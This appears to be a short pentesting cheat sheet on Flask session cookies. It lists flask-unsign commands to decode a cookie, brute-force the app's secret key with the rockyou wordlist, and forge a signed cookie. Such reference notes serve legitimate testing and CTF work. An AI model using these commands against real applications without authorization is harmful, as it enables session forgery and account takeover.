---
title: "Flask Cookie"
date: 2024-6-27
tags: ["flask", "python", "cookie", "sign", "unsign"]
---

---
### Cookie Tools

{{< tab set1 tab1 active >}}flask-unsign{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```bash
# Install
pip3 install flask-unsign
```

```bash
# Decode flask cookie
flask-unsign --decode --cookie <COOKIE>
```

```bash
# Brute force secret key
flask-unsign --unsign --cookie <COOKIE> -w /usr/share/wordlists/rockyou.txt --no-literal-eval
```

```bash
# Forge flask cookie
flask-unsign --sign --cookie <COOKIE_DATA> --secret <SECRET>
```

</div>

{{< /tabcontent >}}

<br>